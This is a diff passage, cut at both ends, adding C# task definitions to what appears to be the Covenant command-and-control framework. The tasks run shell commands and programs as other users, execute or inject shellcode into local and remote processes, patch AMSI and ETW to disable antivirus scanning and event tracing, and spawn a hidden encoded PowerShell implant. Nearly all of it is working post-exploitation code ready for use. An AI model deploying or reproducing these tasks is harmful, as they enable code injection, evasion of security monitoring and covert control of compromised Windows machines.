+                StringBuilder output = new StringBuilder();
+                byte[] buffer = new byte[4096];
+                uint bytesRead;
+
+                while (ReadFile(hReadPipe, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero) && bytesRead > 0)
+                {
+                    output.Append(Encoding.Default.GetString(buffer, 0, (int)bytesRead));
+                }
+
+                WaitForSingleObject(pi.hProcess, 30000);
+                CloseHandle(hReadPipe);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+
+                return output.ToString();
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
   TaskingType: Assembly
   UnsafeCompile: false
   TokenTask: false
   Options:
-  - Name: Code
+  - Name: Command
     Value: ''
-    DefaultValue: ''
-    Description: C# code to execute.
+    DefaultValue: 'whoami'
+    Description: Shell command to execute.
     SuggestedValues: []
     Optional: false
     DisplayInCommand: true
     FileOption: false
-  ReferenceSourceLibraries:
-  - Name: SharpSploit
-    Description: SharpSploit is a library for C# post-exploitation modules.
-    Location: SharpSploit\SharpSploit\
-    Language: CSharp
-    CompatibleDotNetVersions: *o0
-    ReferenceAssemblies:
-    - Name: System.Management.Automation.dll
-      Location: net35\System.Management.Automation.dll
-      DotNetVersion: Net35
-    - Name: System.Management.dll
-      Location: net40\System.Management.dll
-      DotNetVersion: Net40
-    - Name: System.Management.Automation.dll
-      Location: net40\System.Management.Automation.dll
-      DotNetVersion: Net40
-    - Name: System.IdentityModel.dll
-      Location: net40\System.IdentityModel.dll
-      DotNetVersion: Net40
-    - Name: System.dll
-      Location: net40\System.dll
-      DotNetVersion: Net40
-    - Name: System.DirectoryServices.dll
-      Location: net40\System.DirectoryServices.dll
-      DotNetVersion: Net40
-    - Name: System.Core.dll
-      Location: net40\System.Core.dll
-      DotNetVersion: Net40
-    - Name: mscorlib.dll
-      Location: net40\mscorlib.dll
-      DotNetVersion: Net40
-    - Name: System.Management.dll
-      Location: net35\System.Management.dll
-      DotNetVersion: Net35
-    - Name: mscorlib.dll
-      Location: net35\mscorlib.dll
-      DotNetVersion: Net35
-    - Name: System.Core.dll
-      Location: net35\System.Core.dll
-      DotNetVersion: Net35
-    - Name: System.DirectoryServices.dll
-      Location: net35\System.DirectoryServices.dll
-      DotNetVersion: Net35
-    - Name: System.dll
-      Location: net35\System.dll
-      DotNetVersion: Net35
-    - Name: System.IdentityModel.dll
-      Location: net35\System.IdentityModel.dll
-      DotNetVersion: Net35
-    EmbeddedResources: []
-  ReferenceAssemblies: []
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: Username to run as.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Domain
+    Value: ''
+    DefaultValue: '.'
+    Description: Domain (use . for local).
+    SuggestedValues: ['.']
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: Password for the user.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: runas
+  Aliases: []
+  Description: Execute any program as another user using P/Invoke CreateProcessWithLogonW.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: runas /program:\"C:\\Windows\\System32\\cmd.exe\" /arguments:\"/c whoami\" /username:admin /domain:. /password:pass123"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Text;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool CreateProcessWithLogonW(
+            string lpUsername, string lpDomain, string lpPassword,
+            uint dwLogonFlags, string lpApplicationName, string lpCommandLine,
+            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        private struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public int dwX, dwY, dwXSize, dwYSize;
+            public int dwXCountChars, dwYCountChars, dwFillAttribute;
+            public int dwFlags;
+            public short wShowWindow, cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput, hStdOutput, hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess, hThread;
+            public int dwProcessId, dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public bool bInheritHandle;
+        }
+
+        private const uint LOGON_WITH_PROFILE = 0x00000001;
+        private const uint CREATE_NO_WINDOW = 0x08000000;
+        private const int STARTF_USESTDHANDLES = 0x00000100;
+        private const uint HANDLE_FLAG_INHERIT = 0x00000001;
+
+        public static string Execute(string Program, string Arguments, string Username, string Domain, string Password)
+        {
+            try
+            {
+                IntPtr hReadPipe, hWritePipe;
+                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
+                sa.nLength = Marshal.SizeOf(sa);
+                sa.bInheritHandle = true;
+                sa.lpSecurityDescriptor = IntPtr.Zero;
+
+                if (!CreatePipe(out hReadPipe, out hWritePipe, ref sa, 0))
+                    return "Failed to create pipe. Error: " + Marshal.GetLastWin32Error();
+
+                SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
+
+                STARTUPINFO si = new STARTUPINFO();
+                si.cb = Marshal.SizeOf(si);
+                si.dwFlags = STARTF_USESTDHANDLES;
+                si.hStdOutput = hWritePipe;
+                si.hStdError = hWritePipe;
+                si.hStdInput = IntPtr.Zero;
+
+                PROCESS_INFORMATION pi;
+                string cmdLine = string.IsNullOrEmpty(Arguments) ? Program : Program + " " + Arguments;
+
+                bool success = CreateProcessWithLogonW(
+                    Username, Domain, Password,
+                    LOGON_WITH_PROFILE, null, cmdLine,
+                    CREATE_NO_WINDOW, IntPtr.Zero, null,
+                    ref si, out pi);
+
+                CloseHandle(hWritePipe);
+
+                if (!success)
+                    return "CreateProcessWithLogonW failed. Error: " + Marshal.GetLastWin32Error();
+
+                StringBuilder output = new StringBuilder();
+                byte[] buffer = new byte[4096];
+                uint bytesRead;
+
+                while (ReadFile(hReadPipe, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero) && bytesRead > 0)
+                {
+                    output.Append(Encoding.Default.GetString(buffer, 0, (int)bytesRead));
+                }
+
+                WaitForSingleObject(pi.hProcess, 30000);
+                CloseHandle(hReadPipe);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+
+                return output.Length > 0 ? output.ToString() : "Process started as " + Domain + "\\" + Username + " (PID: " + pi.dwProcessId + ")";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Program
+    Value: ''
+    DefaultValue: 'C:\Windows\System32\cmd.exe'
+    Description: Full path to program to execute.
+    SuggestedValues: ['C:\Windows\System32\cmd.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe']
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Arguments
+    Value: ''
+    DefaultValue: ''
+    Description: Arguments to pass to the program.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: Username to run as.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Domain
+    Value: ''
+    DefaultValue: '.'
+    Description: Domain (use . for local).
+    SuggestedValues: ['.']
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: Password for the user.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: shellcode
+  Aliases: []
+  Description: Execute shellcode in the current process using P/Invoke VirtualAlloc and CreateThread.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: shellcode /shellcodebytes:<base64>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+
+        private const uint MEM_COMMIT = 0x1000;
+        private const uint MEM_RESERVE = 0x2000;
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+        private const uint MEM_RELEASE = 0x8000;
+
+        public static string Execute(string ShellcodeBytes)
+        {
+            try
+            {
+                byte[] sc = Convert.FromBase64String(ShellcodeBytes);
+
+                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (addr == IntPtr.Zero)
+                    return "VirtualAlloc failed. Error: " + Marshal.GetLastWin32Error();
+
+                Marshal.Copy(sc, 0, addr, sc.Length);
+
+                uint threadId;
+                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
+                if (hThread == IntPtr.Zero)
+                {
+                    VirtualFree(addr, 0, MEM_RELEASE);
+                    return "CreateThread failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                WaitForSingleObject(hThread, 0xFFFFFFFF);
+                CloseHandle(hThread);
+                VirtualFree(addr, 0, MEM_RELEASE);
+
+                return "Shellcode executed successfully. Thread ID: " + threadId;
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ShellcodeBytes
+    Value: ''
+    DefaultValue: ''
+    Description: Base64 encoded shellcode bytes.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: inject
+  Aliases: []
+  Description: Inject shellcode into a remote process using P/Invoke VirtualAllocEx, WriteProcessMemory, CreateRemoteThread.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: inject /pid:1234 /shellcodebytes:<base64>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
+        private const uint MEM_COMMIT = 0x1000;
+        private const uint MEM_RESERVE = 0x2000;
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        public static string Execute(string Pid, string ShellcodeBytes)
+        {
+            try
+            {
+                int processId = int.Parse(Pid);
+                byte[] sc = Convert.FromBase64String(ShellcodeBytes);
+
+                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
+                if (hProcess == IntPtr.Zero)
+                    return "OpenProcess failed. Error: " + Marshal.GetLastWin32Error();
+
+                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (addr == IntPtr.Zero)
+                {
+                    CloseHandle(hProcess);
+                    return "VirtualAllocEx failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                UIntPtr bytesWritten;
+                if (!WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out bytesWritten))
+                {
+                    CloseHandle(hProcess);
+                    return "WriteProcessMemory failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                uint threadId;
+                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
+                if (hThread == IntPtr.Zero)
+                {
+                    CloseHandle(hProcess);
+                    return "CreateRemoteThread failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                CloseHandle(hThread);
+                CloseHandle(hProcess);
+
+                return "Shellcode injected into PID " + processId + ". Remote thread ID: " + threadId;
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Pid
+    Value: ''
+    DefaultValue: ''
+    Description: Target process ID.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: ShellcodeBytes
+    Value: ''
+    DefaultValue: ''
+    Description: Base64 encoded shellcode bytes.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: bypassamsi
+  Aliases: []
+  Description: Patch AMSI in the current process using P/Invoke to disable scanning.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: bypassamsi"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
+
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        public static string Execute()
+        {
+            try
+            {
+                // Load amsi.dll if not already loaded
+                IntPtr hAmsi = GetModuleHandle("amsi.dll");
+                if (hAmsi == IntPtr.Zero)
+                {
+                    hAmsi = LoadLibrary("amsi.dll");
+                    if (hAmsi == IntPtr.Zero)
+                        return "AMSI not loaded and could not be loaded. May not be applicable.";
+                }
+
+                // Get AmsiScanBuffer address
+                IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+                if (pAmsiScanBuffer == IntPtr.Zero)
+                    return "Could not find AmsiScanBuffer. Error: " + Marshal.GetLastWin32Error();
+
+                // Patch bytes - return AMSI_RESULT_CLEAN immediately
+                // x64: mov eax, 0x80070057 (E_INVALIDARG); ret
+                // x86: mov eax, 0x80070057; ret 0x18
+                byte[] patch;
+                if (IntPtr.Size == 8)
+                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                else
+                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+                uint oldProtect;
+                if (!VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
+                    return "VirtualProtect failed. Error: " + Marshal.GetLastWin32Error();
+
+                Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
+
+                uint ignore;
+                VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out ignore);
+
+                return "AMSI bypassed successfully. AmsiScanBuffer patched at 0x" + pAmsiScanBuffer.ToString("X");
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: bypassetw
+  Aliases: []
+  Description: Patch ETW in the current process using P/Invoke to disable event tracing.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: bypassetw"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
+
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        public static string Execute()
+        {
+            try
+            {
+                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
+                if (hNtdll == IntPtr.Zero)
+                    return "Could not get ntdll.dll handle.";
+
+                IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+                if (pEtwEventWrite == IntPtr.Zero)
+                    return "Could not find EtwEventWrite. Error: " + Marshal.GetLastWin32Error();
+
+                // Patch: ret 0 (xor eax, eax; ret)
+                byte[] patch;
+                if (IntPtr.Size == 8)
+                    patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
+                else
+                    patch = new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax, eax; ret 0x14
+
+                uint oldProtect;
+                if (!VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
+                    return "VirtualProtect failed. Error: " + Marshal.GetLastWin32Error();
+
+                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
+
+                uint ignore;
+                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out ignore);
+
+                return "ETW bypassed successfully. EtwEventWrite patched at 0x" + pEtwEventWrite.ToString("X");
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: spawnas
+  Aliases: []
+  Description: Spawn a new Grunt as another user using P/Invoke CreateProcessWithLogonW.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: spawnas /launcher:<base64> /username:admin /domain:. /password:pass123"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool CreateProcessWithLogonW(
+            string lpUsername, string lpDomain, string lpPassword,
+            uint dwLogonFlags, string lpApplicationName, string lpCommandLine,
+            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        private struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public int dwX, dwY, dwXSize, dwYSize;
+            public int dwXCountChars, dwYCountChars, dwFillAttribute;
+            public int dwFlags;
+            public short wShowWindow, cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput, hStdOutput, hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess, hThread;
+            public int dwProcessId, dwThreadId;
+        }
+
+        private const uint LOGON_WITH_PROFILE = 0x00000001;
+        private const uint CREATE_NO_WINDOW = 0x08000000;
+
+        public static string Execute(string Launcher, string Username, string Domain, string Password)
+        {
+            try
+            {
+                STARTUPINFO si = new STARTUPINFO();
+                si.cb = Marshal.SizeOf(si);
+
+                PROCESS_INFORMATION pi;
+
+                // PowerShell encoded command launcher
+                string cmdLine = "powershell.exe -nop -w hidden -enc " + Launcher;
+
+                bool success = CreateProcessWithLogonW(
+                    Username, Domain, Password,
+                    LOGON_WITH_PROFILE, null, cmdLine,
+                    CREATE_NO_WINDOW, IntPtr.Zero, null,
+                    ref si, out pi);
+
+                if (!success)
+                    return "CreateProcessWithLogonW failed. Error: " + Marshal.GetLastWin32Error();
+
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+
+                return "Grunt spawned as " + Domain + "\\" + Username + " (PID: " + pi.dwProcessId + ")";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Launcher
+    Value: ''
+    DefaultValue: ''
+    Description: Base64 encoded PowerShell launcher.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: false
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: Username to spawn as.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Domain
+    Value: ''
+    DefaultValue: '.'
+    Description: Domain (use . for local).
+    SuggestedValues: ['.']
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: Password for the user.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
